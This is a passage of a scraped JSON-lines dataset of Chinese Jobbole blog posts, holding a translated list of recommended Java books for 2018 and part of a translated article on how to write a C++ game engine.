bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/wx232824506\">学以致用123</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/wx232824506\">\r\n\t\t\t<img src=\"http://jbcdn2.b0.upaiyun.com/2015/04/8fbdaaa5ea6d3b49c8c1c825aafeb5d9.png\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            应用软件开发，主要用python、sql        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/wx232824506\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/wx232824506/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/wx232824506/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 21</a>        </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "其他,StackOverflow", "url": "http://blog.jobbole.com/114166/", "url_obj_id": "3c54b89b3dd03db77b3745813da08bcc"}
{"front_img_url": ["http://jbcdn2.b0.upaiyun.com/2012/03/stack-of-books2.jpg"], "title": "2018 年 Java 程序员必读的十本书", "create_date": "2018/06/17 ·", "praise_num": 2, "fav_num": 6, "comment_num": 0, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/yizhe\">yizhe</a> 翻译，<a href=\"http://www.jobbole.com/members/hanxiaomax\">艾凌风</a> 校稿。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"http://www.java67.com/2018/02/10-books-java-developers-should-read-in.html\">Javin Paul </a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><p>大家好，如果你是一名 Java 程序员，正在考虑 2018 年读什么书，那么这篇文章正适合你。本文中，我将分享 10 本有关 Java、Spring 及其他相关技术的书籍。 这里面既有适合经验丰富的 Java 程序员的书，它们介绍了架构、云开发、微服务、Java 9、Spring 5，以及用于提高生产效率的 Kotlin。同时也照顾到了初级的、缺乏经验的、或正打算 2018 年开始入门 Java 的新手。</p>\n<p>同时，我也介绍了一些在 2018 年学习 Java 9 的书籍。有些已经针对 Java SE 9 全面更新，比如 《写给大忙人看的Java SE 9》和 《Java 9 编程入门官方教程》。</p>\n<p>如果你刚开始学习 Java 或者正打算要学，这些书都非常适合。不推荐读旧版本的书来入门，除非是《Head First Java》。</p>\n<p>我特别希望《Head First Java》的第三版是一个长期的版本，作者和出版方最好针对 Java 8 和 Java 9 进行全面更新。不过对于入门 Java 的编程小白来说，旧版本的《Head First Java》仍然是一本好书。</p>\n<p>我最近添加到这个书单的就是这本今天刚发现的《云原生 Java》。这本书看起来特别棒，它介绍了目前急需的，利用 Spring Boot、Spring Cloud 和 Cloud Foundry 在云上开发 Java 应用的知识。虽然还没读完，但它看起来特别棒。</p>\n<p>2018 年可以用来提升 Java 知识技能的书太多了，你不可能把他们都读完。不过有些书你绝对不想错过，比如《Effective Java（第三版）》，我把它放在了书单的最上面。</p>\n<p>书单里的书介绍了 Java 9、Spring 5、Kotlin、软件架构、微服务、云以及 Java 8 的一些特性。</p>\n<p>这个书单不是很长，但里面的书都很棒，都挺适合在上下班路上读。</p>\n<h3>1. 《Effective Java（第三版）》（Effective Java 3rd Edition）</h3>\n<p>如果你还没读过这本书，那它绝对是 2018 年你必须读的第一本书。第三版是一个长期版本，其实它早就该出版了。这版书也囊括了 JDK 7、8、9 的新特性。</p>\n<p>我在 1 月份的第一个星期就拿到了这本书，它绝对是约书亚·布洛克（Joshua Bloch）给 Java 程序员最好的新年礼物。</p>\n<p>我花了大概一个星期就读完了这本书。我发现读的过程中，时常碰到新的知识点，特别是关于 Java 8 和 Java 9 的。</p>\n<p>我从这本书中学到了 Java 的模块化，它也帮我理顺了之前对于 Java 8 的一些误解。</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2018/03/4835b82477bba7a02b19e0655a1bec19.jpg\"><img src=\"http://jbcdn2.b0.upaiyun.com/2018/03/4835b82477bba7a02b19e0655a1bec19-231x300.jpg\" alt=\"effective java\"></a></p>\n<h3>2. 《现代 Java 开发范例》（Modern Java Recipes）</h3>\n<p>如果你喜欢范例类型的书，那这本书就很不错。就像简介里提到的，这本书提供了解决 Java 8 和 Java 9 中一些难题的简单方案。</p>\n<p>你会学到如何使用 Java 8 的 lambda 表达式、方法引用以及 Stream API 写代码。</p>\n<p>如果你想通过手册和范例来学习 Java 8 和 Java 9 ，这本书就很完美。</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2018/03/10103a0f7df31fa02f1a6eb2ff884f67.jpg\"><img src=\"http://jbcdn2.b0.upaiyun.com/2018/03/10103a0f7df31fa02f1a6eb2ff884f67-229x300.jpg\" alt=\"modern java recipes\"></a></p>\n<h3>3. 《Java 9 模块化》（Java 9 Modularity）</h3>\n<p>Java 9 的一个亮点就是 Java 的模块化，本书对这部分做了最全面的介绍。</p>\n<p>作者桑德斯·马克（Sanders Mak）是 Java 9 模块化的权威。我听过很多他讲 Java 9 的课程，比如在 Pluarlsight 做的《Java 9 模块化及新特性》。我可以保证，读完此书之后，你绝不会后悔。</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2018/03/5fa3843943b0e8a3a222ac4ed7b47608.jpg\"><img src=\"http://jbcdn2.b0.upaiyun.com/2018/03/5fa3843943b0e8a3a222ac4ed7b47608-229x300.jpg\" alt=\"java 9 modularity\"></a></p>\n<h3>4. 《写给大忙人看的Java SE 9（第二版）》 （Core Java SE 9 for the Impatient (2nd Edition)）</h3>\n<p>如果你急着学 Java 那我推荐这本书给你。我是凯 S·霍斯特曼 (Cay S. Horstmann)的一个忠实粉丝，他的文采之优美、涉猎之广，都让我很是佩服。</p>\n<p>你读了他写的关于 Java 8、Scala 的书以及《Java 核心编程》之后，绝对也会成为他的粉丝。</p>\n<p>这本书已经针对 Java SE 9 全面更新。如果你想学习 Java 9，那2018年你应该先读读这本书。</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2018/03/d4bfce708107af712925d529c54d5e99.jpg\"><img src=\"http://jbcdn2.b0.upaiyun.com/2018/03/d4bfce708107af712925d529c54d5e99-230x300.jpg\" alt=\"core java se 9 for the impatient\"></a></p>\n<p> </p>\n<h3>5. 《Java 8入门》（Beginning Java 8 Language Features）</h3>\n<p>尽管已经发布快 4 年了，仍然有很多 Java 程序员还没有开始使用 Java 8。</p>\n<p>如果你是这些人的一员，或者还不是很理解 lambda 表达式、Stream API、Optional 及 Java 8 其他的特性，那你一定要读这本书。</p>\n<p>这是一个系列，共有3卷，此卷通俗易懂的讲解了 Java 8 的基础知识。</p>\n<p>另外两卷则延伸到 Java 8 的高级特性，比如 JDBC、Swing、 Java FX，以及 Java 网络 API。</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2018/03/b2fdbde13702ef6ccc6e95c18fccc452.jpg\"><img src=\"http://jbcdn2.b0.upaiyun.com/2018/03/b2fdbde13702ef6ccc6e95c18fccc452-243x300.jpg\" alt=\"java 8 language feature\"></a></p>\n<h3>6. 《Spring 微服务实战》（Spring Microservices in Action）</h3>\n<p>软件开发世界正在加速转向微服务架构，它在开发、维护、部署、扩容性及可靠性等方面有很多优势。</p>\n<p>感谢 Spring framework 提供这么多开发微服务的 Java 工具，比如 Spring Boot 和 Spring Cloud。</p>\n<p>如果你对用 Spring framework 开发微服务有兴趣，那么这本书很适合你。</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2018/03/0c7932ef6b030895a79464812a84700d.jpg\"><img src=\"http://jbcdn2.b0.upaiyun.com/2018/03/0c7932ef6b030895a79464812a84700d-239x300.jpg\" alt=\"Spring microservices in action\"></a></p>\n<h3>7. 《架构整洁之道》（Clean Architecture）</h3>\n<p>我是在2017年读的这本书，特别喜欢。我是罗伯特 C·马丁（Robert C. Martin）的一个忠实粉丝（大家称之为“ Bob 大叔”）。加上之前的《代码整洁之道（Clean Code）》和《代码整洁之道 程序员的职业素养（Clean Coder book）》，这本书完成了代码整洁之道三部曲。</p>\n<p>它介绍了如何构建可以经受时间考验的软件架构，还消除了对设计模式和软件架构的一些误解。</p>\n<p>如果你是一名经验丰富的 Java 程序员，正想转变为一个方案设计师，那这本书2018年你一定要读完。</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2018/03/16c675023e54c1156f685331fe2ba77f.jpg\"><img src=\"http://jbcdn2.b0.upaiyun.com/2018/03/16c675023e54c1156f685331fe2ba77f-244x300.jpg\" alt=\"clean architecture\"></a></p>\n<h3>8. 《Spring 5 开发范例代码大全》（Spring 5 Recipes: A Problem-Solution Approach）</h3>\n<p>抛开 JDK 9 不谈，2017年另外一个大的版本更新就是 Spring 5 ，它将响应式编程引入了 Spring 。</p>\n<p>既然对 Java 程序员来说， Spring 是无可争议的、最流行的架构，那么学习 Spring 5 让自己紧跟技术潮流，是非常值得的。</p>\n<p>我个人非常喜欢目标导向的范例类图书，这也是我为什么选择了这本书用来学习 Spring 5。</p>\n<p>它不仅覆盖了 Spring 5 的新特性，也讲了其他早期版本的增强。一句话，它教你如何在 Spring 5 的环境下写代码。</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2018/03/5b90e8a41700678ed1c5089d36b03b7b.jpg\"><img src=\"http://jbcdn2.b0.upaiyun.com/2018/03/5b90e8a41700678ed1c5089d36b03b7b-210x300.jpg\" alt=\"Spring 5 Recipes\"></a></p>\n<p> </p>\n<h3>9. 《Kotlin 实战》（Kotlin in Action）</h3>\n<p>Java 程序员通过学习 Scala、Groovy、Closure 等 JVM 语言来成为一名多语言的开发者是很常见的。而 Kotlin 正是当下的热门。</p>\n<p>自从 2017 年 Google 在 Google IO 上宣布将 Kotlin 作为 Android 的官方语言之后，很多人都开始对学习 Kotlin 感兴趣。</p>\n<p>更重要的是，它能提高你的生产效率，而且它和 Java 非常相似。因此，如果你想在 2018 年学习一种 JVM 语言，我建议学习 Kotlin。</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2018/03/4e8ec3dcf9fc58481dd1f235a706ac49.jpg\"><img src=\"http://jbcdn2.b0.upaiyun.com/2018/03/4e8ec3dcf9fc58481dd1f235a706ac49-239x300.jpg\" alt=\"kotlin in action\"></a></p>\n<h3>10. 《Java 9 编程入门官方教程(第七版)》（Java: A Beginner’s Guide, Seventh Edition）</h3>\n<p>这是另一本从零开始学习 Java 的经典书籍。第七版已经针对 Java SE 9 全面更新。</p>\n<p>如果你想在 2018 年开始你的 Java 程序员生涯，这本书可以帮你学到最新版本的 Java。</p>\n<p>这本书比书单里的第二本更全面。</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2018/03/68129204cb656d6f7e0c4d4b65b7b727.jpg\"><img src=\"http://jbcdn2.b0.upaiyun.com/2018/03/68129204cb656d6f7e0c4d4b65b7b727-241x300.jpg\" alt=\"java a beginner\"></a></p>\n<p> </p>\n<h3>11. 《云原生 Java》（Cloud Native Java）</h3>\n<p>恭喜读到这里的朋友，你们收获了一个彩蛋 ——《云原生 Java》，2018 年最有用的 Java 书籍。</p>\n<p>当今的软件开发，大都是关于云、微服务、分布式架构等等。乔氏·隆（Josh Long）和肯尼·巴斯塔尼（Kenny Bastani）在这本书里向 Java/JVM 开发者展示了如何使用 Spring Boot、Spring Cloud 和 Cloud Foundry 构建更好、更快的 Java 应用程序。</p>\n<p>对于经验丰富的 Java 开发者来说，它绝对是一本必读书。尽管它介绍了相对高级的内容，我还是强烈推荐每一位 Java 程序员都读一下。</p>\n<p>实际上，我还没有读完这本书。但是读完前言之后，我就对所讨论的话题非常感兴趣。我可能在读完之后再写一篇详细的文章。但它绝对值得各位至少读一遍。</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2018/03/50634ad6517cc268b7e595a1a3799b9e.jpg\"><img src=\"http://jbcdn2.b0.upaiyun.com/2018/03/50634ad6517cc268b7e595a1a3799b9e-229x300.jpg\" alt=\"cloud native java\"></a></p>\n<p>这就是 2018 年 Java 程序员可以读的一些有趣、有用的书籍。实话实说，即使是让自己紧跟 Java 世界的技术潮流，比如 Java 9、Sprig 5、微服务、Kotlin 等，也还有一大堆东西等着你去学习。这些书不仅仅更新你的知识，还能让你对一些技术的理解更加深刻。</p>\n<p>多谢阅读。如果你喜欢这些书，就把它们分享给你的朋友和同学吧。如果有任何建议，或有书籍想在2018年分享给大家，欢迎留言。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113955\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113955votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113955\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 6 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/yizhe\">yizhe</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/yizhe\">\r\n\t\t\t<img src=\"http://jbcdn2.b0.upaiyun.com/2018/03/4d71b9b6d5a7e0f78b88a7a273cddd74.jpg\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            JAVA软件工程师        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/yizhe\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/yizhe/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/yizhe/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 11</a>        </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "书籍与教程,java,书籍", "url": "http://blog.jobbole.com/113955/", "url_obj_id": "0645d6761f7b849238e3183e177cfb24"}
{"front_img_url": ["http://wx2.sinaimg.cn/mw690/63918611gy1fre7k2nnx5j20c806wgli.jpg"], "title": "如何编写 C++ 游戏引擎", "create_date": "2018/06/05 ·", "praise_num": 1, "fav_num": 2, "comment_num": 0, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/nemoland\">李大萌</a> 翻译，<a href=\"http://www.jobbole.com/members/hanxiaomax\">艾凌风</a> 校稿。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"http://preshing.com/20171218/how-to-write-your-own-cpp-game-engine/\">Jeff Preshing</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><p>最近我在用 C++ 写游戏引擎，再用这个引擎做了一个移动端小游戏跳一跳（Hop Out）。下面是截自我的 iPhone6 的一个小片段。</p>\n<p>视频地址：http://preshing.com/images/hopoutclip.mp4</p>\n<p>跳一跳是我想玩的游戏类型：3D卡通外观的复古街机游戏。目标是改变每个填充块的颜色，就像Q * Bert一样。</p>\n<p>Hop Out仍在开发中，但引擎的功能已经很完善了，所以我想在这里分享一些关于引擎开发的技巧。</p>\n<p>你为什么想要写一个游戏引擎？可能有很多原因：</p>\n<p>你是个修理工，喜欢从头开始建立系统，直到系统完成。</p>\n<p>关于游戏开发你想了解更多。我在游戏行业工作了14年，现在我仍然在不停的琢磨。我甚至不确定我是否可以从头开始编写一个引擎，因为它与大型工作室的编程工作的日常职责大不相同。我想知道答案。</p>\n<p>你喜欢控制。对完全按照你想要的方式组织代码，知道一切都在哪里，感到满意。</p>\n<p>你可以从<a href=\"https://en.wikipedia.org/wiki/Adventure_Game_Interpreter\">AGI</a>（1984），<a href=\"https://en.wikipedia.org/wiki/Doom_engine\">id Tech 1</a>（1993），<a href=\"https://en.wikipedia.org/wiki/Build_(game_engine)\">Build</a>（1995）等经典游戏引擎以及Unity和Unreal等行业巨头那里获得灵感。</p>\n<p>你相信我们这个游戏产业应该试着去揭开引擎发展的序幕。我们并没有掌握制作游戏的艺术。还离得很远！我们对这个过程的研究越多，改进的机会就越大。</p>\n<p>2017年的游戏平台 – 手机，游戏机和电脑 – 非常强大，而且在很多方面都非常相似。游戏引擎的开发并不是像过去一样，在脆弱和怪异的硬件上挣扎。在我看来，更多是关于自己制造出来的复杂性的斗争。创造一个怪物很容易！这就是为什么本文建议围绕着保持事情可控的原因。我把它分成三部分：</p>\n<ol>\n<li>使用迭代方法</li>\n<li>在统一事物前要三思</li>\n<li>请注意，序列化是一个很大的课题</li>\n</ol>\n<p>这个建议适用于任何类型的游戏引擎。我不会告诉你如何编写着色器，八叉树是什么，或者如何添加物体。这些事儿，都是我假设你已经知道而且应该知道 – 这很大程度上取决于你想要制作的游戏类型。相反，我故意选择了一些似乎没有被广泛承认或提及的观点 – 这些是我在试图揭开一个主题神秘面纱时最感兴趣的一些观点。</p>\n<h2></h2>\n<h2>使用迭代方法</h2>\n<p>我的第一条建议是使一些东西（任何东西），快速运行起来，然后迭代。</p>\n<p>如果可能的话，从一个示例应用程序开始，初始化设备并在屏幕上绘制一些东西。就我而言，我下载了<a href=\"https://www.libsdl.org/\">SDL</a>，打开了Xcode-iOS / Test / TestiPhoneOS.xcodeproj，然后在我的iPhone上运行了testgles2示例。</p>\n<p><img class=\"alignnone\" src=\"http://wx3.sinaimg.cn/mw690/63918611gy1fre7k1rqtzj20c806v747.jpg\" width=\"440\" height=\"247\"></p>\n<p>瞧！我使用OpenGL ES 2.0，生成了一个可爱的旋转立方体。</p>\n<p>下一步，是下载一个其他人制作的马里奥3D 模型。我写了一个快速和粗糙的OBJ文件加载器 – 文件格式并不太复杂 – 并且修改了例程，来呈现Mario，而不是一个立方体。我还集成了<a href=\"https://www.libsdl.org/projects/SDL_image/\">SDL_Image</a>来帮助加载纹理。</p>\n<p><strong><img src=\"http://wx2.sinaimg.cn/mw690/63918611gy1fre7k28su5j20c806w3yd.jpg\"></strong></p>\n<p>然后我实现了一个双摇杆控制器用来操控马里奥（我本来想要创建的是一个双摇杆设计游戏，并不是马里奥。）</p>\n<p><img src=\"http://wx2.sinaimg.cn/mw690/63918611gy1fre7k2nnx5j20c806wgli.jpg\"></p>\n<p>接下来，我想探索骨骼动画，所以我打开了<a href=\"https://www.blender.org/\">Blender</a>，做了一个触手模型，并且用一个前后摆动的双骨架来操纵它。</p>\n<p><img src=\"http://wx4.sinaimg.cn/mw690/63918611gy1fre7k31x17j20c7078dgc.jpg\"></p>\n<p>此时，我放弃了OBJ文件格式，编写了一个Python脚本来从Blender导出自定义的JSON文件。这些JSON文件描述了皮肤网格，骨架和动画数据。在<a href=\"https://github.com/nlohmann/json\">C ++ JSON库</a>的帮助下将这些文件加载到游戏中。</p>\n<p><img src=\"http://wx3.sinaimg.cn/mw690/63918611gy1fre7k3ob2mj20c806wq2y.jpg\"></p>\n<p>一旦这个完成，我回到了Blender，并做了更详细的角色设计。 （这是我创造的第一个被操纵的3D人，我为他感到骄傲。）</p>\n<p><img src=\"http://wx3.sinaimg.cn/mw690/63918611gy1fre7k42k6mj20c806w3za.jpg\"></p>\n<p>在接下来的几个月里，我采取了以下几个步骤：</p>\n<ol>\n<li>开始将向量和矩阵函数分解成我自己的3D数学库。</li>\n<li>用CMake项目替换.xcodeproj。</li>\n<li>在Windows和iOS上运行引擎，因为我喜欢在Visual Studio下工作。</li>\n<li>开始将代码移动到单独的“引擎”和“游戏”库中。随着时间的推移，我把它们分成更细粒度的库。</li>\n<li>写了一个单独的应用程序将我的JSON文件转换为游戏可以直接加载的二进制数据。</li>\n<li>最终从iOS版本中删除所有SDL库。 （Windows版本仍然使用SDL。）</li>\n</ol>\n<p>重点是：在开始编程之前，我没有对引擎架构进行设计。这是一个经过深思熟虑的选择。相反，我只是写了实现下一个特性的最简单的代码，然后我会查看代码，看看会出现什么自然生成的架构。我说的“引擎架构”是指组成游戏引擎的模块集，这些模块之间的依赖关系，以及用于与每个模块交互的 <a href=\"https://en.wikipedia.org/wiki/Application_programming_interface\">API</a>。</p>\n<p><img src=\"http://wx1.sinaimg.cn/mw690/63918611gy1fre7k4nmzbj20c405h3ye.jpg\"></p>\n<p>这是一个<a href=\"https://en.wikipedia.org/wiki/Iterative_and_incremental_development\">迭代</a>的方法，因为它关注于较小的可交付成果。它在编写游戏引擎时效果非常好，因为在每个步骤中，你都有一个正在运行的程序。如果在将代码合成到新模块中时出现问题，可以随时将做的更改与以前工作的代码进行比较。显然，我假设你在使用<a href=\"https://www.perforce.com/blog/list-of-equivalent-commands-in-git-mercurial-and-svn\">某种源代码管理工具</a>。</p>\n<p>你可能会认为这种方法浪费了很多时间，因为总是在编写糟糕的代码，之后需要清理。但是大部分的清理操作都是将代码从一个.cpp文件移动到另一个，将函数声明提取到.h文件中，或者直接进行简单的修改。决定事情应该去哪是难点，但是这在已经有代码的时候会更容易决定。</p>\n<p>我认为用相反的方法：试图设计出一个能够提前完成所有需求的架构，会浪费更多的时间。我最喜欢的两篇关于系统过度设计风险的文章是 <a href=\"http://altdevblog.com/2011/04/01/vicious-circle-of-generalization/\">Tomasz Dąbrowski 的《泛化的恶性循环》</a>和 <a href=\"https://www.joelonsoftware.com/2001/04/21/dont-let-architecture-astronauts-scare-you/\">Joel Spolsky 的《不要让架构太空人吓到你》</a>。</p>\n<p>我并不是说在用代码处理问题之前，不应该在纸上进行设计。我也不是说你不应该事先决定你想要的功能。比如，我从一开始就知道我想让我的引擎在后台线程中加载所有资源。我只是没有尝试设计或实现该功能，直到我的引擎首先加载一些资源。</p>\n<p>迭代的方法给了我一个比我以前盯着一张白纸冥思苦想更优雅的架构。我的引擎的iOS版本现在是 100％ 原始代码，包括自定义数学库，容器模板，反射/序列化系统，渲染框架，物理模块和音频混合器。我可以编写每一个模块，但是你可能没有必要自己写所有这些东西。你可能会发现适合自己引擎的许多优秀的开源代码库。 <a href=\"https://glm.g-truc.net/\">GLM</a>、<a href=\"https://pybullet.org/wordpress/\">Bullet Physics</a> 和 <a href=\"https://github.com/nothings/stb\">STB 头文件</a>只是一些有趣的例子。</p>\n<h2>在整合事物太多之前要三思</h2>\n<p>作为程序员，我们尽量避免代码重复，喜欢代码遵循统一的风格。不过，我认为不要让这些本能凌驾于每一个决定之上。</p>\n<h4>偶尔要抵制一下 DRY 原则</h4>\n<p>举个例子，我的引擎包含了几个“智能指针”模板类，与 std :: shared_ptr 类似。每一个指针作为一个原始指针的包装，有助于防止内存泄漏。</p>\n<ul>\n<li>&lt;&gt; 是用于具有单个所有者的动态分配的对象。</li>\n<li>Reference&lt;&gt; 使用引用计数来允许一个对象拥有多个所有者。</li>\n<li>audio :: AppOwned &lt;&gt; 被音频混音器以外的代码调用，允许游戏系统拥有音频混音器使用的对象，例如当前播放的语音。</li>\n<li>audio :: AudioHandle &lt;&gt; 使用音频混音器内部的引用计数系统。</li>\n</ul>\n<p>这样可能看起来像其中一些类复制了其它的功能，违反 <a href=\"https://en.wikipedia.org/wiki/Don%27t_repeat_yourself\">DRY（不要重复自己）</a>的原则。事实上，在开发早期，我尽可能地重用现有的Reference &lt;&gt;类。但是，我发现音频对象的生命周期是由特殊规则来管理的：如果一个音频语音已经完成了一个样本的播放，并且游戏没有指向该语音的指针，那么该语音会被立即到删除排队等待。如果游戏持有指针，则不应删除这个语音对象。如果游戏持有一个指针，但指针的所有者在语音结束之前被销毁，这段语音应该被取消，而不是增加Reference &lt;&gt;的复杂性，我决定引入单独的模板类，这样更为实用。</p>\n<p>95％ 的时间都在重用现有的代码。但是，如果你开始感到麻痹，或者发现自己增加了一件简单的事情的复杂性，那就问自己，代码库中的东西是否应该是两件事。</p>\n<h4>可以使用不同的调用规则</h4>\n<p>我不喜欢Java的一件事是，它强迫你在一个类中定义每个函数。在我看来，这是无稽之谈。这可能会使你的代码看起来更加一致，但是它也鼓励过度工程，并且不适合我前面描述的迭代方法。</p>\n<p>在我的 C++ 引擎中，一些函数属于类，有些则不属于类。例如，游戏中的每个敌人都是一个类，可能就像你预料的那样，大部分敌人的行为都是在这个类内部实现的。另一方面，在我的引擎中投射的球体是通过调用 <a href=\"https://stackoverflow.com/questions/7136449/shape-casting-a-capsule-against-convex-polyhedra\">sphereCast(</a>) 函数来执行的，这是物理命名空间中的一个函数。 sphereCast() 不属于任何类 – 它只是物理模块的一部分。我构建了一个系统来管理模块之间的依赖关系，这使得我的代码组织得很好。将这个函数包装在一个任意的类中不会以任何有意义的方式改善代码的组织。</p>\n<p>然后是<a href=\"https://en.wikipedia.org/wiki/Dynamic_dispatch\">动态调度</a>，这是一种<a href=\"https://en.wikipedia.org/wiki/Polymorphism_(computer_science)\">多态的形式</a>。我们经常需要为一个对象调用一个函数，而不知道该对象的确切类型。 C ++程序员的第一本能是用虚函数定义抽象基类，然后在派生类中重写这些函数。这是有效的，但这只是一种技术。还有其他动态调度技术，不会引入额外的代码，或带来其他好处：</p>\n<p> </p>\n<ul>\n<li>C ++ 11引入了std :: function，这是存储回调函数的一个简便方法。也可以编写自己的std :: function版本，这样在调试中不会那么痛苦。</li>\n<li>许多回调函数可以用一对指针来实现：一个函数指针和一个类型不确定的参数。它只需要在回调函数中进行明确的转换。你在纯C语言库中经常看到。</li>\n<li>有时候，底层类型实际上是在编译时已知的，你可以绑定这个函数调用而不用额外的运行开销。 <a href=\"https://github.com/preshing/turf\">Turf</a>是我在游戏引擎中使用的一个库，它非常依赖这种技术。例如看到turf:: Mutex,这只是针对特定平台类的定义。</li>\n<li>有时，最直接的方法是自己构建和维护一个原始函数指针表。我在我的音频混音器和序列化系统中使用了这种方法。Python解释器也大量使用这种技术，如下所述。</li>\n<li>你甚至可以将函数指针存储在散列表中，使用函数名称作为关键字。我使用这种技术来调度输入事件，如多点触控事件。这是记录游戏输入并用重放系统回放的策略的一部分。</li>\n</ul>\n<p>动态调度是一个很大的课题。我只是想表明，有很多方法来实现它。你编写的可扩展底层代码越多（这在游戏引擎中很常见），越会发现替代方法越多。如果你不习惯这种编程，C语言编写的Python解释器是一个很好的学习资源。它实现了一个强大的对象模型：每个PyObject都指向一个PyTypeObject，每个PyTypeObject都包含一个用于动态分配的函数指针表。如果你想直接跳转到其中的话，<a href=\"https://docs.python.org/3/extending/newtypes.html\">定义新类型</a>的文档是一个很好的起点。</p>\n<h2>注意序列化是一个大问题</h2>\n<p><a href=\"https://en.wikipedia.org/wiki/Serialization\">序列化</a>是将运行时对象转换为字节序列的操作。换句话说，就是保存和加载数据。</p>\n<p>对于许多游戏引擎来说，游戏内容以各种可编辑的格式创建，例如.png，.json，.blend或专有格式，然后最终转换为特定于平台的可以快速加载到引擎的游戏格式。流水线中的最后一个应用通常被称为“炊具”。炊具可能被集成到另一个工具，甚至分布在几台机器上。通常，炊具和一些工具是与游戏引擎本身一起开发和维护的。</p>\n<p><img 